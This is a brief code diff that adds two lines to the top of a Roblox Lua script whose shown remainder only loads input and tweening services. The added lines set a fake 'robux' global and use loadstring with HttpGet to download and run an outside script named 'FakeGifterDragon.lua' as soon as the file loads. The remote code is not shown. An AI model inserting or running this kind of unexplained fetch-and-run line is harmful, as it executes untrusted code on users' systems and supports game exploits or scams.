@@ -1,3 +1,5 @@
+getgenv().robux = 999999
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/FakeGifterDragon.lua"))()
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 
